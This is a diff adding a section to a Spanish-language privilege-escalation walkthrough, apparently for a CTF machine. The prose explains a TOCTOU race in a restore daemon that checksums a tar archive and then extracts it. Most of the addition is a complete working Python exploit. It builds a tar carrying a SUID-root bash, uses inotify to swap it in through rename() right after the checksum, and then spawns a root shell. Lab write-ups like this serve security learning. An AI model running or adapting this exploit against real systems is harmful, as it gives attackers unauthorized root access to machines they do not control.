@@ -439,4 +439,149 @@ Hay 2 procesos claves en la escalada de privilegio:
 /opt/backup/backup.sh
 /opt/backup/restore_daemon.sh
 
+En restore_daemon hay una vulnerabilidad muy concreta: RACE CONDITION TOCTOU (Time of check to time of use)
+
+El proceso , antes de descomprimir el archivo _opt ... hay una condicion if para hacerle un checksum.
+
+La vulnerabilidad ocurre entre esos dos fragmentos en la linea del codigo, el checksum intenta verificar un archivo tar con un nombre concreto > en esos milisegundos donde justo el archivo se acaba de verificar mediante checksum debemos de renombrar nuestro tar malicioso por el que espera el programa. Justo despues pasa a la siguiente linia donde tar descomprime el archivo. Si los tiempos son exactos, el archivo que se descomprimira será el nuestro mediante esa rapidez que nos proporciona rename() la cual es la syscall directa al kernel de linux para renombrar un archivo.
+
+
+``` py
+
+import os
+import sys
+import time
+import struct
+import threading
+from ctypes import CDLL, util
+
+# CONFIG 
+
+DIRECTORIO_MONITOREO = "/var/restore_work"
+
+RUTA_PAYLOAD         = "/tmp/payload.tar.gz"
+
+BINARIO_TARGET       = "/opt/blocksynergy/.diag"
+
+TRIGGERS = ["/opt/staging/restore", "/opt/blocksynergy/restore"]
+
+PATRONES_ARCHIVO = ["_opt_staging.tar.gz", "_opt_blocksynergy.tar.gz"]
+
+INTERRUPTOR_EXITO = False
+
+def crear_payload():
+    
+    comando = (f"tar --owner=0 --group=0 --mode=4755 --transform='s|^bash$|opt/blocksynergy/.bash|' -czf {RUTA_PAYLOAD} -C /bin bash")
+    os.system(comando)
+    print("[+] Payload generado correctamente en /tmp")
+
+def activar_daemon():
+
+    for ruta in TRIGGERS:
+        os.system(f"touch {ruta}")
+
+
+def verificar_permiso_suid():
+    
+    try:
+        modo = os.stat(BINARIO_TARGET).st_mode
+        return bool(modo & 0o4000)
+    except OSError:
+        return False
+
+
+
+# INOTIFY
+
+def monitorear_y_reemplazar():
+    """
+    Escucha eventos del Kernel mediante inotify. 
+    En cuanto el daemon abre/lee el archivo legitimo, lo reemplaza atómicamente con el payload.
+    """
+    global INTERRUPTOR_EXITO
+
+    # Cargar API inotify desde la biblioteca estándar C (libc)
+    libc = CDLL(util.find_library("c"))
+    fd_inotify = libc.inotify_init()
+
+    # Máscara de eventos: IN_CLOSE_NOWRITE | IN_ATTRIB | IN_OPEN | IN_ACCESS
+    MASCARA_EVENTOS = 0x10 | 0x08 | 0x100 | 0x80
+    libc.inotify_add_watch(fd_inotify, DIRECTORIO_MONITOREO.encode(), MASCARA_EVENTOS)
+
+    while True:
+        data = os.read(fd_inotify, 4096)
+        posicion = 0
+
+        while posicion < len(data):
+            # Desempaquetar la cabecera struct inotify_event
+            _, mascara, _, longitud_nombre = struct.unpack_from("iIII", data, posicion)
+            posicion += struct.calcsize("iIII")
+
+            # Extraer el nombre del archivo creado en el directorio
+            nombre_bytes = data[posicion : posicion + longitud_nombre]
+            nombre_archivo = nombre_bytes.split(b"\x00")[0].decode()
+            posicion += longitud_nombre
+
+            # Validar si el archivo coincide con los patrones esperados
+            es_archivo_objetivo = any(patron in nombre_archivo for patron in PATRONES_ARCHIVO)
+            evento_lectura_completada = bool(mascara & 0x10)  # IN_CLOSE_NOWRITE
+
+            if es_archivo_objetivo and evento_lectura_completada:
+                ruta_destino = os.path.join(DIRECTORIO_MONITOREO, nombre_archivo)
+                
+                # REEMPLAZO ATÓMICO (rename)
+                os.rename(RUTA_PAYLOAD, ruta_destino)
+                print(f"[+] Reemplazo atómico realizado -> {ruta_destino}")
+                
+                INTERRUPTOR_EXITO = True
+                return
+
+# Main 
+
+def ejecutar_explotacion():
+    
+    global INTERRUPTOR_EXITO
+
+    crear_payload()
+
+    # Iniciar hilo secundario de escucha inotify
+    hilo_escucha = threading.Thread(target=monitorear_y_reemplazar, daemon=True)
+    hilo_escucha.start()
+
+    # Bucle de reintentos para ganar la carrera
+    MAX_INTENTOS = 40
+    for intento in range(1, MAX_INTENTOS + 1):
+        print(f"[*] Intento de carrera {intento}/{MAX_INTENTOS}")
+        
+        activar_daemon()
+        time.sleep(3)
+
+        if INTERRUPTOR_EXITO:
+            time.sleep(2)
+            if verificar_permiso_suid():
+                print("[+] ¡Éxito! Permiso SUID obtenido.")
+                break
+            
+            # Si se ejecutó el swap pero no se obtuvo SUID, resetear y reintentar
+            print("[-] Swap sucessfully but SUID not obtained.")
+            crear_payload()
+            INTERRUPTOR_EXITO = False
+            
+            hilo_escucha = threading.Thread(target=monitorear_y_reemplazar, daemon=True)
+            hilo_escucha.start()
+
+    # Evaluación final de resultados
+    if verificar_permiso_suid():
+        print("[+] shell Root")
+        os.execv(BINARIO_TARGET, [BINARIO_TARGET, "-p"])
+    else:
+        print("[!] The race wasn't won, please try again.")
+
+
+if __name__ == "__main__":
+    
+    ejecutar_explotacion()
+
+```
+
 
